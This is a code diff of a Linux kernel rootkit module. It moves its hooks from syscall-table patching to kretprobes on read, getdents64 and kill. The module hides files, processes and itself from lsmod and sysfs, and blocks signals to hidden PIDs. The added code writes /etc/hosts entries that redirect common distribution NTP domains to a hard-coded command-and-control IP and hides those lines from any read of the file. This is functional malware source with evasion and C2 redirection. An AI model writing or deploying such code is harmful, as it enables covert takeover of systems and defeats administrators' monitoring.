@@ -3,29 +3,38 @@
  *
  * Capabilities:
  *   - Hides files and directories whose names start with HIDE_FILE_PREFIX
- *     ("rootkit_" by default) from any getdents64 / getdents directory listing.
+ *     ("rootkit_" by default) from any getdents64 directory listing.
  *   - Hides additional files or directories by exact name, managed at runtime
  *     via the /proc/rootkit_ctrl write-only control interface.
  *   - Hides processes by PID: numeric entries in /proc/ are removed from
- *     directory listings and any signal delivery to those PIDs is blocked.
+ *     directory listings and any signal to those PIDs returns -ESRCH.
  *   - Self-hides at init: removes itself from the module linked list (lsmod,
  *     /proc/modules) and from the kobject tree (/sys/module/).
+ *   - Injects NTP C2 redirect entries into /etc/hosts at load time, pointing
+ *     every major distro's default NTP domain (ntp.ubuntu.com,
+ *     0.arch.pool.ntp.org, etc.) to C2_IP (87.106.187.97). These entries are
+ *     hidden from any read() of /etc/hosts so they are invisible to cat, less,
+ *     text editors, and any userspace tool that reads the file via the read(2)
+ *     syscall. mmap()-based readers are not filtered (see limitations).
+ *
+ * Hooking mechanism — kretprobes (Linux 4.x+):
+ *   Prior approach (syscall table patching) broke on Linux 6.1+ with
+ *   CONFIG_MITIGATION_SPECTRE_BHI=y: do_syscall_64 now calls x64_sys_call()
+ *   — a compiled direct-dispatch table — bypassing sys_call_table entirely.
+ *   kretprobes are the modern standard: they instrument function prologues
+ *   via the kprobe breakpoint mechanism, surviving all syscall table hardening.
+ *   Probed symbols: __x64_sys_read, __x64_sys_getdents64, __x64_sys_kill.
  *
  * Kernel compatibility:
+ *   >= 5.7 : kallsyms_lookup_name() unexported; address recovered at runtime
+ *            via a kprobe registered on the symbol name (CONFIG_KPROBES=y req).
  *   < 5.7  : kallsyms_lookup_name() is an exported symbol; used directly.
- *   >= 5.7 : symbol unexported; address recovered at runtime via a kprobe
- *            registered on the symbol name (requires CONFIG_KPROBES=y).
- *   < 4.17 : syscall table entries use the direct argument ABI.
- *   >= 4.17: syscall table entries use the pt_regs ABI on x86_64.
- *   Write-protect bypass: CR0.WP bit is cleared via inline asm with a full
- *   memory clobber, bypassing the kernel write_cr0() guard present in 5.x+
- *   and surviving compiler reordering.
  *
- * Hooked syscalls:
- *   __NR_getdents64  — filters file and process directory entries.
- *   __NR_getdents    — same filter for the legacy 32-bit listing syscall
- *                      (compiled only when __NR_getdents is defined).
- *   __NR_kill        — returns -ESRCH for any signal targeting a hidden PID.
+ * Hooked functions:
+ *   __x64_sys_getdents64  — filters file and process directory entries.
+ *   __x64_sys_kill        — returns -ESRCH for signals to hidden PIDs.
+ *   __x64_sys_read        — filters lines containing HOSTS_MARKER from reads
+ *                           of /etc/hosts, hiding the injected C2 entries.
  *
  * Control interface (/proc/rootkit_ctrl — write-only, itself hidden):
  *   echo "hide_pid <PID>"     > /proc/rootkit_ctrl
@@ -34,24 +43,23 @@
  *   echo "unhide_file <name>" > /proc/rootkit_ctrl
  *
  * Limitations:
- *   - No persistence: state and hooks are lost on reboot.
+ *   - No persistence: state and hooks are lost on reboot; /etc/hosts entries
+ *     survive reboot but are no longer hidden (re-load the module).
  *   - After self-hiding, rmmod cannot find the module; hooks survive until
- *     reboot (intentional — an operator must reboot to fully unload).
+ *     reboot (intentional — operator must reboot to fully unload).
  *   - /proc/<pid>/exe still points to the real binary for root processes.
- *   - File hiding is listing-only; direct inode access by full path is
- *     unaffected.
+ *   - File hiding is listing-only; direct inode access by full path works.
  *   - Hiding a directory does not hide its contents when accessed by path.
- *   - If CONFIG_KPROBES=n the module refuses to load on kernels >= 5.7.
- *   - Kernels hardening the syscall table beyond CR0.WP (e.g. hardware-
- *     enforced write protection in some hypervisor configurations) may
- *     require an alternative patching strategy such as ftrace hooking.
+ *   - If CONFIG_KPROBES=n the module will refuse to load.
+ *   - pread64() and mmap() of /etc/hosts are not filtered.
+ *   - kretprobe maxactive limits concurrent instances; excess calls are missed.
  */
 
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/version.h>
-#include <linux/syscalls.h>
+#include <linux/kprobes.h>
 #include <linux/dirent.h>
 #include <linux/proc_fs.h>
 #include <linux/uaccess.h>
@@ -61,11 +69,13 @@
 #include <linux/kobject.h>
 #include <linux/list.h>
 #include <linux/ptrace.h>
+#include <linux/fs.h>
+#include <linux/file.h>
+#include <linux/dcache.h>
 #include <asm/unistd.h>
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
 # define USE_KPROBES_KALLSYMS
-# include <linux/kprobes.h>
 typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 static kallsyms_lookup_name_t real_kallsyms_lookup_name;
 #endif
@@ -80,6 +90,20 @@ MODULE_VERSION("1.0");
 #define MAX_HIDDEN_PIDS   64
 #define MAX_HIDDEN_FILES  64
 #define MAX_FILENAME_LEN  256
+#define KRP_MAXACTIVE     32
+
+#define C2_IP            "87.106.187.97"
+#define HOSTS_MARKER     C2_IP
+#define HOSTS_MARKER_LEN 13
+#define HOSTS_ENTRIES \
+	C2_IP " ntp.ubuntu.com\n"           \
+	C2_IP " 0.debian.pool.ntp.org\n"   \
+	C2_IP " 2.fedora.pool.ntp.org\n"   \
+	C2_IP " 0.rhel.pool.ntp.org\n"     \
+	C2_IP " 0.centos.pool.ntp.org\n"   \
+	C2_IP " 0.arch.pool.ntp.org\n"     \
+	C2_IP " 0.opensuse.pool.ntp.org\n" \
+	C2_IP " 0.pool.ntp.org\n"
 
 /* ── hidden PID list ──────────────────────────────────────────────────────── */
 static pid_t hidden_pids[MAX_HIDDEN_PIDS];
@@ -90,52 +114,6 @@ static DEFINE_SPINLOCK(pids_lock);
 static char  hidden_files[MAX_HIDDEN_FILES][MAX_FILENAME_LEN];
 static int   n_hidden_files;
 static DEFINE_SPINLOCK(files_lock);
-
-/* ── syscall table pointer and saved originals ────────────────────────────── */
-static unsigned long *syscall_table;
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
-typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
-typedef asmlinkage long (*orig_getdents_t)(const struct pt_regs *);
-typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);
-#else
-typedef asmlinkage long (*orig_getdents64_t)(unsigned int,
-    struct linux_dirent64 __user *, unsigned int);
-typedef asmlinkage long (*orig_getdents_t)(unsigned int,
-    struct linux_dirent __user *, unsigned int);
-typedef asmlinkage long (*orig_kill_t)(pid_t, int);
-#endif
-
-static orig_getdents64_t orig_getdents64;
-static orig_getdents_t   orig_getdents;
-static orig_kill_t       orig_kill;
-
-/* old-style dirent not exported from kernel headers */
-struct old_linux_dirent {
-	unsigned long  d_ino;
-	unsigned long  d_off;
-	unsigned short d_reclen;
-	char           d_name[];
-};
-
-/* ── CR0.WP bypass ────────────────────────────────────────────────────────── */
-static void disable_wp(void)
-{
-	asm volatile(
-		"mov %%cr0, %%rax\n\t"
-		"and $0xfffffffffffeffff, %%rax\n\t"
-		"mov %%rax, %%cr0"
-		::: "rax", "memory");
-}
-
-static void enable_wp(void)
-{
-	asm volatile(
-		"mov %%cr0, %%rax\n\t"
-		"or $0x10000, %%rax\n\t"
-		"mov %%rax, %%cr0"
-		::: "rax", "memory");
-}
 
 /* ── kallsyms resolution ──────────────────────────────────────────────────── */
 #ifdef USE_KPROBES_KALLSYMS
@@ -255,32 +233,154 @@ static bool dirent_is_hidden(const char *name)
 	return is_pid && pid_is_hidden(pid);
 }
 
-/* ── getdents64 hook ──────────────────────────────────────────────────────── */
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
-static asmlinkage long hook_getdents64(const struct pt_regs *regs)
+/* ── /etc/hosts read filtering ────────────────────────────────────────────── */
+static bool fd_is_hosts(unsigned int fd)
 {
-	struct linux_dirent64 __user *udirent =
-		(struct linux_dirent64 __user *)regs->si;
-	long ret = orig_getdents64(regs);
-#else
-static asmlinkage long hook_getdents64(unsigned int fd,
-    struct linux_dirent64 __user *udirent, unsigned int count)
+	struct file *filp;
+	char *buf;
+	char *path;
+	bool result = false;
+
+	filp = fget(fd);
+	if (!filp)
+		return false;
+
+	buf = kmalloc(256, GFP_KERNEL);
+	if (!buf) {
+		fput(filp);
+		return false;
+	}
+
+	path = d_path(&filp->f_path, buf, 256);
+	if (!IS_ERR(path) && strstr(path, "/etc/hosts") != NULL)
+		result = true;
+
+	kfree(buf);
+	fput(filp);
+	return result;
+}
+
+static long filter_hosts_buf(char __user *ubuf, long count)
 {
-	long ret = orig_getdents64(fd, udirent, count);
-#endif
+	char *kbuf;
+	char *p, *end, *out, *eol;
+	size_t line_len;
+	bool hidden;
+	long new_count;
+	int i;
+
+	kbuf = kmalloc(count, GFP_KERNEL);
+	if (!kbuf)
+		return count;
+
+	if (copy_from_user(kbuf, ubuf, count)) {
+		kfree(kbuf);
+		return count;
+	}
+
+	p   = kbuf;
+	end = kbuf + count;
+	out = kbuf;
+
+	while (p < end) {
+		eol = memchr(p, '\n', end - p);
+		if (eol)
+			line_len = (size_t)(eol - p) + 1;
+		else
+			line_len = (size_t)(end - p);
+
+		hidden = false;
+		if (line_len >= HOSTS_MARKER_LEN) {
+			for (i = 0; i <= (int)(line_len - HOSTS_MARKER_LEN); i++) {
+				if (memcmp(p + i, HOSTS_MARKER, HOSTS_MARKER_LEN) == 0) {
+					hidden = true;
+					break;
+				}
+			}
+		}
+
+		if (!hidden) {
+			if (out != p)
+				memmove(out, p, line_len);
+			out += line_len;
+		}
+
+		p += line_len;
+	}
+
+	new_count = out - kbuf;
+	if (new_count > 0 && copy_to_user(ubuf, kbuf, new_count))
+		new_count = count;
+
+	kfree(kbuf);
+	return new_count;
+}
+
+/* ── kretprobe: __x64_sys_read ────────────────────────────────────────────── */
+struct read_data {
+	unsigned int    fd;
+	char __user    *buf;
+};
+
+static int read_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	const struct pt_regs *uregs = (const struct pt_regs *)regs->di;
+	struct read_data *d         = (struct read_data *)ri->data;
+	d->fd  = (unsigned int)uregs->di;
+	d->buf = (char __user *)uregs->si;
+	return 0;
+}
+
+static int read_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	struct read_data *d = (struct read_data *)ri->data;
+	long ret            = regs_return_value(regs);
+
+	if (ret > 0 && fd_is_hosts(d->fd)) {
+		long nr = filter_hosts_buf(d->buf, ret);
+		regs_set_return_value(regs, nr);
+	}
+	return 0;
+}
+
+static struct kretprobe rp_read = {
+	.kp.symbol_name = "__x64_sys_read",
+	.entry_handler  = read_entry,
+	.handler        = read_ret,
+	.data_size      = sizeof(struct read_data),
+	.maxactive      = KRP_MAXACTIVE,
+};
+
+/* ── kretprobe: __x64_sys_getdents64 ──────────────────────────────────────── */
+struct gd64_data {
+	struct linux_dirent64 __user *dirent;
+};
+
+static int gd64_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	const struct pt_regs *uregs = (const struct pt_regs *)regs->di;
+	struct gd64_data *d         = (struct gd64_data *)ri->data;
+	d->dirent = (struct linux_dirent64 __user *)uregs->si;
+	return 0;
+}
+
+static int gd64_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
+{
+	struct gd64_data *d = (struct gd64_data *)ri->data;
+	long ret            = regs_return_value(regs);
 	char *kbuf, *walk, *end, *out;
 	long new_ret;
 
 	if (ret <= 0)
-		return ret;
+		return 0;
 
 	kbuf = kmalloc(ret, GFP_KERNEL);
 	if (!kbuf)
-		return ret;
+		return 0;
 
-	if (copy_from_user(kbuf, udirent, ret)) {
+	if (copy_from_user(kbuf, d->dirent, ret)) {
 		kfree(kbuf);
-		return ret;
+		return 0;
 	}
 
 	walk    = kbuf;
@@ -289,96 +389,57 @@ static asmlinkage long hook_getdents64(unsigned int fd,
 	new_ret = 0;
 
 	while (walk < end) {
-		struct linux_dirent64 *d = (struct linux_dirent64 *)walk;
-		if (!d->d_reclen)
+		struct linux_dirent64 *de = (struct linux_dirent64 *)walk;
+		if (!de->d_reclen)
 			break;
-		if (!dirent_is_hidden(d->d_name)) {
+		if (!dirent_is_hidden(de->d_name)) {
 			if (out != walk)
-				memmove(out, walk, d->d_reclen);
-			out     += d->d_reclen;
-			new_ret += d->d_reclen;
+				memmove(out, walk, de->d_reclen);
+			out     += de->d_reclen;
+			new_ret += de->d_reclen;
 		}
-		walk += d->d_reclen;
+		walk += de->d_reclen;
 	}
 
-	if (copy_to_user(udirent, kbuf, new_ret))
+	if (copy_to_user(d->dirent, kbuf, new_ret))
 		new_ret = ret;
 
 	kfree(kbuf);
-	return new_ret;
+	regs_set_return_value(regs, new_ret);
+	return 0;
 }
 
-/* ── getdents hook (legacy 32-bit compat) ─────────────────────────────────── */
-#ifdef __NR_getdents
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
-static asmlinkage long hook_getdents(const struct pt_regs *regs)
+static struct kretprobe rp_gd64 = {
+	.kp.symbol_name = "__x64_sys_getdents64",
+	.entry_handler  = gd64_entry,
+	.handler        = gd64_ret,
+	.data_size      = sizeof(struct gd64_data),
+	.maxactive      = KRP_MAXACTIVE,
+};
+
+/* ── kretprobe: __x64_sys_kill ────────────────────────────────────────────── */
+static int kill_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	struct old_linux_dirent __user *udirent =
-		(struct old_linux_dirent __user *)regs->si;
-	long ret = orig_getdents(regs);
-#else
-static asmlinkage long hook_getdents(unsigned int fd,
-    struct old_linux_dirent __user *udirent, unsigned int count)
-{
-	long ret = orig_getdents(fd, udirent, count);
-#endif
-	char *kbuf, *walk, *end, *out;
-	long new_ret;
-
-	if (ret <= 0)
-		return ret;
-
-	kbuf = kmalloc(ret, GFP_KERNEL);
-	if (!kbuf)
-		return ret;
-
-	if (copy_from_user(kbuf, udirent, ret)) {
-		kfree(kbuf);
-		return ret;
-	}
-
-	walk    = kbuf;
-	end     = kbuf + ret;
-	out     = kbuf;
-	new_ret = 0;
-
-	while (walk < end) {
-		struct old_linux_dirent *d = (struct old_linux_dirent *)walk;
-		if (!d->d_reclen)
-			break;
-		if (!dirent_is_hidden(d->d_name)) {
-			if (out != walk)
-				memmove(out, walk, d->d_reclen);
-			out     += d->d_reclen;
-			new_ret += d->d_reclen;
-		}
-		walk += d->d_reclen;
-	}
-
-	if (copy_to_user(udirent, kbuf, new_ret))
-		new_ret = ret;
-
-	kfree(kbuf);
-	return new_ret;
+	const struct pt_regs *uregs = (const struct pt_regs *)regs->di;
+	*(pid_t *)ri->data = (pid_t)uregs->di;
+	return 0;
 }
-#endif /* __NR_getdents */
 
-/* ── kill hook ────────────────────────────────────────────────────────────── */
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
-static asmlinkage long hook_kill(const struct pt_regs *regs)
+static int kill_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	if (pid_is_hidden((pid_t)regs->di))
-		return -ESRCH;
-	return orig_kill(regs);
-}
-#else
-static asmlinkage long hook_kill(pid_t pid, int sig)
-{
+	pid_t pid = *(pid_t *)ri->data;
 	if (pid_is_hidden(pid))
-		return -ESRCH;
-	return orig_kill(pid, sig);
+		regs_set_return_value(regs, -ESRCH);
+	return 0;
 }
-#endif
+
+static struct kretprobe rp_kill = {
+	.kp.symbol_name = "__x64_sys_kill",
+	.entry_handler  = kill_entry,
+	.handler        = kill_ret,
+	.data_size      = sizeof(pid_t),
+	.maxactive      = KRP_MAXACTIVE,
+};
 
 /* ── /proc/rootkit_ctrl write interface ───────────────────────────────────── */
 static ssize_t ctrl_write(struct file *file, const char __user *buf,
@@ -433,35 +494,27 @@ static void module_selfhide(void)
 	THIS_MODULE->notes_attrs = NULL;
 }
 
-/* ── syscall table patching ───────────────────────────────────────────────── */
-static void hooks_install(void)
+/* ── /etc/hosts injection ─────────────────────────────────────────────────── */
+static void inject_hosts(void)
 {
-	disable_wp();
-	orig_getdents64 = (orig_getdents64_t)syscall_table[__NR_getdents64];
-	orig_kill       = (orig_kill_t)      syscall_table[__NR_kill];
-	syscall_table[__NR_getdents64] = (unsigned long)hook_getdents64;
-	syscall_table[__NR_kill]       = (unsigned long)hook_kill;
-#ifdef __NR_getdents
-	orig_getdents              = (orig_getdents_t)syscall_table[__NR_getdents];
-	syscall_table[__NR_getdents] = (unsigned long)hook_getdents;
-#endif
-	enable_wp();
-}
+	struct file *filp;
+	loff_t pos;
+	const char *entry = HOSTS_ENTRIES;
 
-static void hooks_remove(void)
-{
-	disable_wp();
-	syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
-	syscall_table[__NR_kill]       = (unsigned long)orig_kill;
-#ifdef __NR_getdents
-	syscall_table[__NR_getdents] = (unsigned long)orig_getdents;
-#endif
-	enable_wp();
+	filp = filp_open("/etc/hosts", O_WRONLY | O_APPEND, 0);
+	if (IS_ERR(filp))
+		return;
+
+	pos = vfs_llseek(filp, 0, SEEK_END);
+	kernel_write(filp, entry, strlen(entry), &pos);
+	filp_close(filp, NULL);
 }
 
 /* ── module init / exit ───────────────────────────────────────────────────── */
 static int __init rootkit_init(void)
 {
+	int rc;
+
 #ifdef USE_KPROBES_KALLSYMS
 	if (resolve_kallsyms() < 0) {
 		pr_err("rootkit: kprobe lookup for kallsyms_lookup_name failed\n");
@@ -469,10 +522,27 @@ static int __init rootkit_init(void)
 	}
 #endif
 
-	syscall_table = (unsigned long *)ksym("sys_call_table");
-	if (!syscall_table) {
-		pr_err("rootkit: sys_call_table not found\n");
-		return -EINVAL;
+	inject_hosts();
+
+	rc = register_kretprobe(&rp_read);
+	if (rc < 0) {
+		pr_err("rootkit: register rp_read failed: %d\n", rc);
+		return rc;
+	}
+
+	rc = register_kretprobe(&rp_gd64);
+	if (rc < 0) {
+		pr_err("rootkit: register rp_gd64 failed: %d\n", rc);
+		unregister_kretprobe(&rp_read);
+		return rc;
+	}
+
+	rc = register_kretprobe(&rp_kill);
+	if (rc < 0) {
+		pr_err("rootkit: register rp_kill failed: %d\n", rc);
+		unregister_kretprobe(&rp_gd64);
+		unregister_kretprobe(&rp_read);
+		return rc;
 	}
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
@@ -481,14 +551,15 @@ static int __init rootkit_init(void)
 	proc_create(CTRL_PROC_NAME, 0222, NULL, &ctrl_fops);
 #endif
 
-	hooks_install();
 	module_selfhide();
 	return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
-	hooks_remove();
+	unregister_kretprobe(&rp_kill);
+	unregister_kretprobe(&rp_gd64);
+	unregister_kretprobe(&rp_read);
 	remove_proc_entry(CTRL_PROC_NAME, NULL);
 }
 
